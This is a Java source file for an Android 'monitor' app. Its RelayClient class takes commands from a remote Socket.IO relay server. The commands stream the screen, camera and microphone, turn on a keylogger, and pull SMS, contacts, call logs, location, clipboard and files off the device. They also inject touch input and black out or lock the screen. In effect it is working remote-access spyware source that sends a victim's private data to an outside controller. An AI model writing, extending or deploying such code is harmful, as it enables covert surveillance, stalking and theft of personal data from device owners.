package com.nora.monitor;

import android.os.Build;
import android.util.Base64;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.net.URISyntaxException;

import io.socket.client.IO;
import io.socket.client.Socket;

public class RelayClient {

    private static final String TAG = "RelayClient";

    private final MonitorService service;
    private final String         agentName;
    private final String         agentSecret;
    private final String         relayUrl;
    private Socket               socket;

    public RelayClient(MonitorService service, String agentName, String agentSecret, String relayUrl) {
        this.service     = service;
        this.agentName   = agentName;
        this.agentSecret = agentSecret;
        this.relayUrl    = relayUrl;
    }

    public void connect() {
        try {
            IO.Options opts = IO.Options.builder()
                .setTransports(new String[]{"websocket", "polling"})
                .setReconnection(true)
                .setReconnectionDelay(5000)
                .build();

            socket = IO.socket(relayUrl, opts);

            socket.on(Socket.EVENT_CONNECT, args -> {
                Log.d(TAG, "Connected as " + agentName);
                try {
                    JSONObject reg = new JSONObject();
                    reg.put("name",     agentName);
                    reg.put("secret",   agentSecret);
                    reg.put("platform", "android");
                    socket.emit("register", reg);
                } catch (JSONException e) {
                    Log.e(TAG, "register error", e);
                }
            });

            socket.on(Socket.EVENT_DISCONNECT, args -> Log.d(TAG, "Disconnected from relay"));

            socket.on("start_screen", args -> {
                android.content.Intent i = new android.content.Intent(
                    service, ScreenCaptureActivity.class);
                i.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK);
                service.startActivity(i);
            });
            socket.on("stop_screen", args -> {
                ScreenService ss = ScreenService.getInstance();
                if (ss != null) ss.stopStream();
            });
            socket.on("camera_on",       args -> service.startCamera());
            socket.on("camera_off",      args -> service.stopCamera());
            socket.on("mic_on",          args -> service.startMic());
            socket.on("mic_off",         args -> service.stopMic());
            socket.on("take_screenshot", args -> {
                ScreenService ss = ScreenService.getInstance();
                if (ss != null) ss.takeScreenshot(args, this);
            });

            socket.on("get_sysinfo", args -> {
                try {
                    JSONObject info = DeviceInfo.getInfo(service);
                    info.put("_requester", requester(args));
                    socket.emit("sysinfo_result", info);
                } catch (Exception e) {
                    Log.e(TAG, "sysinfo error", e);
                }
            });

            socket.on("get_processes", args -> {
                try {
                    JSONArray procs = DeviceInfo.getRunningApps(service);
                    JSONObject res  = new JSONObject();
                    res.put("processes",  procs);
                    res.put("_requester", requester(args));
                    socket.emit("processes_result", res);
                } catch (Exception e) {
                    Log.e(TAG, "processes error", e);
                }
            });

            socket.on("list_dir", args -> {
                try {
                    String path = args.length > 0 ? ((JSONObject) args[0]).optString("path", "") : "";
                    JSONObject res = FileManager.listDir(path);
                    res.put("_requester", requester(args));
                    socket.emit("dir_result", res);
                } catch (Exception e) {
                    Log.e(TAG, "list_dir error", e);
                }
            });

            socket.on("read_file", args -> {
                try {
                    String path = args.length > 0 ? ((JSONObject) args[0]).optString("path", "") : "";
                    JSONObject res = FileManager.readFile(path);
                    res.put("_requester", requester(args));
                    socket.emit("file_data", res);
                } catch (Exception e) {
                    Log.e(TAG, "read_file error", e);
                }
            });

            socket.on("inject_input", args -> {
                if (Build.VERSION.SDK_INT < Build.VERSION_CODES.N) return;
                InputService svc = InputService.getInstance();
                if (svc == null) { Log.w(TAG, "AccessibilityService not running"); return; }
                try {
                    JSONObject p = args.length > 0 ? (JSONObject) args[0] : new JSONObject();
                    String type = p.optString("type", "tap");
                    // Screen is captured at /2 resolution — multiply coords by 2
                    switch (type) {
                        case "tap":
                            svc.tap((float) p.optDouble("x", 0) * 2f, (float) p.optDouble("y", 0) * 2f);
                            break;
                        case "swipe":
                            svc.swipe(
                                (float) p.optDouble("x1", 0) * 2f, (float) p.optDouble("y1", 0) * 2f,
                                (float) p.optDouble("x2", 0) * 2f, (float) p.optDouble("y2", 0) * 2f,
                                p.optLong("duration", 300));
                            break;
                        case "back":    svc.goBack();    break;
                        case "home":    svc.goHome();    break;
                        case "recents": svc.goRecents(); break;
                        default: Log.w(TAG, "unknown input type: " + type);
                    }
                } catch (Exception e) {
                    Log.e(TAG, "inject_input error", e);
                }
            });

            // ── Keylogger ─────────────────────────────────────────────────────
            socket.on("keylog_on", args -> {
                InputService svc = InputService.getInstance();
                if (svc != null) svc.setKeylogEnabled(true);
                emitKeylogStatus(true, requester(args));
            });
            socket.on("keylog_off", args -> {
                InputService svc = InputService.getInstance();
                if (svc != null) svc.setKeylogEnabled(false);
                emitKeylogStatus(false, requester(args));
            });

            // ── Data collection ───────────────────────────────────────────────
            socket.on("get_sms", args -> {
                try {
                    JSONObject res = new JSONObject();
                    res.put("sms",        DataCollector.getSms(service));
                    res.put("_requester", requester(args));
                    socket.emit("sms_result", res);
                } catch (Exception e) { Log.e(TAG, "get_sms error", e); }
            });

            socket.on("get_contacts", args -> {
                try {
                    JSONObject res = new JSONObject();
                    res.put("contacts",   DataCollector.getContacts(service));
                    res.put("_requester", requester(args));
                    socket.emit("contacts_result", res);
                } catch (Exception e) { Log.e(TAG, "get_contacts error", e); }
            });

            socket.on("get_call_logs", args -> {
                try {
                    JSONObject res = new JSONObject();
                    res.put("call_logs",  DataCollector.getCallLogs(service));
                    res.put("_requester", requester(args));
                    socket.emit("call_logs_result", res);
                } catch (Exception e) { Log.e(TAG, "get_call_logs error", e); }
            });

            socket.on("get_wifi_info", args -> {
                try {
                    JSONObject info = DataCollector.getWifiInfo(service);
                    info.put("_requester", requester(args));
                    socket.emit("wifi_info_result", info);
                } catch (Exception e) { Log.e(TAG, "get_wifi_info error", e); }
            });

            socket.on("get_clipboard_content", args -> {
                try {
                    // Read via InputService (AccessibilityService) — allowed on Android 10+
                    String text = "";
                    InputService inputSvc = InputService.getInstance();
                    if (inputSvc != null) {
                        text = inputSvc.readClipboard();
                    } else {
                        text = DataCollector.getClipboard(service);
                    }
                    JSONObject res = new JSONObject();
                    res.put("text",       text);
                    res.put("_requester", requester(args));
                    socket.emit("clipboard_content_result", res);
                } catch (Exception e) { Log.e(TAG, "get_clipboard_content error", e); }
            });

            socket.on("set_clipboard", args -> {
                try {
                    JSONObject p = args.length > 0 ? (JSONObject) args[0] : new JSONObject();
                    String text = p.optString("text", "");
                    InputService inputSvc = InputService.getInstance();
                    if (inputSvc != null) {
                        inputSvc.writeClipboard(text);
                    } else {
                        android.content.ClipboardManager cm = (android.content.ClipboardManager)
                            service.getSystemService(android.content.Context.CLIPBOARD_SERVICE);
                        if (cm != null) cm.setPrimaryClip(android.content.ClipData.newPlainText("", text));
                    }
                    JSONObject res = new JSONObject();
                    res.put("ok", true);
                    res.put("_requester", requester(args));
                    socket.emit("set_clipboard_result", res);
                } catch (Exception e) { Log.e(TAG, "set_clipboard error", e); }
            });

            socket.on("get_installed_apps", args -> {
                try {
                    JSONObject res = new JSONObject();
                    res.put("apps",       DataCollector.getInstalledApps(service));
                    res.put("_requester", requester(args));
                    socket.emit("installed_apps_result", res);
                } catch (Exception e) { Log.e(TAG, "get_installed_apps error", e); }
            });

            socket.on("get_location", args -> {
                final String req = requester(args);
                DataCollector.getLocation(service, result -> {
                    try {
                        result.put("_requester", req);
                        socket.emit("location_result", result);
                    } catch (Exception e) { Log.e(TAG, "get_location result error", e); }
                });
            });

            // ── Screen off / lock ─────────────────────────────────────────────
            socket.on("screen_off", args -> {
                service.lockScreen(requester(args));
            });

            // ── Black screen overlay ──────────────────────────────────────────
            socket.on("screen_dark", args -> {
                try {
                    service.getScreenOverlay().showBlackScreen();
                    JSONObject res = new JSONObject();
                    res.put("ok", true);
                    res.put("_requester", requester(args));
                    socket.emit("screen_dark_result", res);
                } catch (Exception e) { Log.e(TAG, "screen_dark error", e); }
            });
            socket.on("screen_dark_off", args -> {
                try {
                    service.getScreenOverlay().hideBlackScreen();
                    JSONObject res = new JSONObject();
                    res.put("ok", true);
                    res.put("_requester", requester(args));
                    socket.emit("screen_dark_result", res);
                } catch (Exception e) { Log.e(TAG, "screen_dark_off error", e); }
            });

            socket.connect();
        } catch (URISyntaxException e) {
            Log.e(TAG, "bad URI: " + relayUrl, e);
        }
    }

    private static String requester(Object[] args) {
        try {
            if (args != null && args.length > 0 && args[0] instanceof JSONObject)
                return ((JSONObject) args[0]).optString("_requester");
        } catch (Exception ignored) {}
        return null;
    }

    public void emitFrame(byte[] jpeg)    { emitBytes("frame",        jpeg); }
    public void emitCamera(byte[] jpeg)   { emitBytes("camera_frame", jpeg); }
    public void emitAudio(byte[] pcm)     { emitBytes("audio",        pcm);  }

    public void emitKeyChar(String ch) {
        if (!connected()) return;
        try {
            JSONObject obj = new JSONObject();
            obj.put("char", ch);
            socket.emit("key", obj);
        } catch (JSONException e) {
            Log.e(TAG, "emitKeyChar error", e);
        }
    }

    public void emitNotification(JSONObject data) {
        if (!connected()) return;
        socket.emit("notification_event", data);
    }

    public void emitScreenOff(JSONObject data) {
        if (!connected()) return;
        socket.emit("screen_off_result", data);
    }

    private void emitKeylogStatus(boolean enabled, String req) {
        if (!connected()) return;
        try {
            JSONObject obj = new JSONObject();
            obj.put("enabled",    enabled);
            obj.put("_requester", req);
            socket.emit("keylog_status", obj);
        } catch (JSONException e) {
            Log.e(TAG, "emitKeylogStatus error", e);
        }
    }

    public void emitScreenshot(byte[] data, String req) {
        if (!connected()) return;
        try {
            JSONObject obj = new JSONObject();
            obj.put("data",       Base64.encodeToString(data, Base64.NO_WRAP));
            obj.put("_requester", req);
            socket.emit("screenshot_result", obj);
        } catch (JSONException e) {
            Log.e(TAG, "emitScreenshot error", e);
        }
    }

    private void emitBytes(String event, byte[] bytes) {
        if (!connected()) return;
        try {
            JSONObject obj = new JSONObject();
            obj.put("data", Base64.encodeToString(bytes, Base64.NO_WRAP));
            socket.emit(event, obj);
        } catch (JSONException e) {
            Log.e(TAG, "emit " + event + " error", e);
        }
    }

    private boolean connected() {
        return socket != null && socket.connected();
    }

    public void disconnect() {
        if (socket != null) socket.disconnect();
    }
}
